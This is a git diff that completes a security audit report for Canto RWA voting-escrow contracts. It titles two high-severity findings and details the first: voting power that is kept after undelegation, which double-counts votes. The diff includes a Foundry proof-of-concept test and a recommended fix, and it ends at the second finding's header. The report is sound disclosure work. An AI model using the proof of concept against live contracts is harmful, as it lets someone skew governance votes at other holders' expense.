@@ -14,8 +14,8 @@ The contracts implement a voting-escrow incentivization model for Canto RWA (Rea
 
 | ID  | Title                            | Severity   |
 |-----|----------------------------------|------------|
-| [H01](#h01---xxx) | XXX                              | High       |
-| [H02](#h02---xxx) | XXX                              | High       |
+| [H01](#h01---xxx) | Retained Voting Power After Undelegation                              | High       |
+| [H02](#h02---xxx) | Removal of a Gauge Locks User Voting Power                              | High       |
 | [QA Report](#QA---xxx) | Inflated Balance After Reward Token Reintroduction                              | Grade: A   |
 
 ---
@@ -25,7 +25,7 @@ The contracts implement a voting-escrow incentivization model for Canto RWA (Rea
 ### High Findings
 
 <details>
-  <summary><a id="h01---xxx"></a>[H01] - XXX</summary>
+  <summary><a id="h01---xxx"></a>[H01] - Retained Voting Power After Undelegation</summary>
   
   <br>
 
@@ -33,46 +33,139 @@ The contracts implement a voting-escrow incentivization model for Canto RWA (Rea
   
 - High Risk
 
-## **Relevant GitHub Links:** 
-
-- 
-
 ## **Summary:** 
 
-- 
+When tokens are delegated from one user (User A) to another (User B), the voting power is correctly combined. However, an inconsistency arises when the tokens are undelegated. If User B does not cast another vote after undelegation, they retain the combined voting power. This results in an inflated voting power for User B, which can skew the outcomes of votes. The sequence of events is as follows:
 
-## **Vulnerability Details:** 
+- User A delegates to User B.
+- User B votes for Gauge A using the combined voting power.
+- In the next epoch, User A undelegates from User B.
+- User A votes for Gauge B.
+- Despite the undelegation, User B's voting power remains inflated unless they cast another vote.
 
-- 
+## **Proof Of Concept:** 
+
+The test case below demonstrates this behaviour:
 
 ```solidity
+function testDelegateUndelegate() public {
+        vm.startPrank(gov);
+        gc.add_gauge(gauge1);
+        gc.add_gauge(gauge2);
+        gc.change_gauge_weight(gauge1, 100);
+        gc.change_gauge_weight(gauge2, 100);
+        vm.stopPrank();
 
+        vm.deal(user1, 1 ether);
+        vm.deal(user2, 1 ether);
+
+        // user 1 create lock
+        vm.prank(user1);
+        ve.createLock{value: 1 ether}(1 ether);
+
+        // user 2 create lock
+        vm.prank(user2);
+        ve.createLock{value: 1 ether}(1 ether);
+
+        // user 1 delegate to user 2
+        vm.prank(user1);
+        ve.delegate(user2);
+
+        // user 2 vote for gauge 2 with user 1's voting power and user 2's voting power
+        vm.prank(user2);
+        gc.vote_for_gauge_weights(gauge2, 10000);
+
+        // warp to next week
+        vm.warp(block.timestamp + 1 weeks);
+
+        console.log("User 1 -> No votes, delegates to User 2");
+        console.log("user 2 -> Votes for gauge 2 with User 1's voting power and User 2's voting power");
+        // console log divider
+        console.log("--------------------------------------------------");
+
+        (uint256 slopeUser1, uint256 powerUser1,) = gc.vote_user_slopes(user1, gauge1);
+        console.log("user 1 vote slope", slopeUser1);
+        console.log("user 1 vote power", powerUser1);
+        // console log divider
+        console.log("--------------------------------------------------");
+
+        (uint256 slopeUser2, uint256 powerUser2,) = gc.vote_user_slopes(user2, gauge2);
+        console.log("user 2 vote slope", slopeUser2);
+        console.log("user 2 vote power", powerUser2);
+        // console log divider
+        console.log("--------------------------------------------------");
+
+        // check relative weights
+        console.log("relative weight g1", gc.gauge_relative_weight_write(gauge1, block.timestamp));
+        console.log("relative weight g2", gc.gauge_relative_weight_write(gauge2, block.timestamp));
+        // console log divider
+        console.log("--------------------------------------------------");
+        //check total weights
+        console.log("total weight", gc._get_sum());
+        // console log divider
+        console.log("--------------------------------------------------");
+
+        // user 1 undelegate
+        vm.prank(user1);
+        ve.delegate(user1);
+
+        //user1 vote for gauge 1
+        vm.prank(user1);
+        gc.vote_for_gauge_weights(gauge1, 10000);
+
+        gc.checkpoint_gauge(gauge1);
+        gc.checkpoint_gauge(gauge2);
+
+        // warp to next week
+        vm.warp(block.timestamp + 1 weeks);
+        console.log("next week ");
+        console.log("User 1 -> Undelegates from User 2, votes for gauge 1");
+        console.log("user 2 -> No action");
+        // console log divider
+        console.log("--------------------------------------------------");
+
+        (uint256 week2slopeUser1, uint256 week2powerUser1,) = gc.vote_user_slopes(user1, gauge1);
+        console.log("user 1 vote slope", week2slopeUser1);
+        console.log("user 1 vote power", week2powerUser1);
+        // console log divider
+        console.log("--------------------------------------------------");
+
+        (uint256 week2slopeUser2, uint256 week2powerUser2,) = gc.vote_user_slopes(user2, gauge2);
+        console.log("user 2 vote slope", week2slopeUser2);
+        console.log("user 2 vote power", week2powerUser2);
+        // console log divider
+        console.log("--------------------------------------------------");
+
+        // check relative weights
+        console.log("relative weight g1", gc.gauge_relative_weight_write(gauge1, block.timestamp));
+        console.log("relative weight g2", gc.gauge_relative_weight_write(gauge2, block.timestamp));
+        // console log divider
+        console.log("--------------------------------------------------");
+        //check total weights
+        console.log("total weight", gc._get_sum());
+    }
 ```
 
-- 
-  
-```solidity
+Analyzing the test case output reveals:
 
-```
-  
-## **Impact:** 
-
-- 
+- In the initial stages, User 1 delegates their voting power to User 2, and User 2 votes for gauge 2. At this juncture, the calculations appear accurate.
+- However, post-undelegation by User 1 and their subsequent vote for gauge 1, the voting power for gauge 2 remains unchanged from the previous epoch. This effectively means that User 1's voting power gets double-counted.
 
 ## **Tools Used:** 
 
-- 
+- Manual analysis
+- Foundry
 
 ## **Recommendation:** 
 
-- 
+Reset Votes on delegation: Nullify the delegator's/delegatee’s votes once they delegate their power.
 
 </details>
 
 ---
 
 <details>
-  <summary><a id="h02---xxx"></a>[H02] - XXX</summary>
+  <summary><a id="h02---xxx"></a>[H02] - Removal of a Gauge Locks User Voting Power</summary>
   
   <br>
 
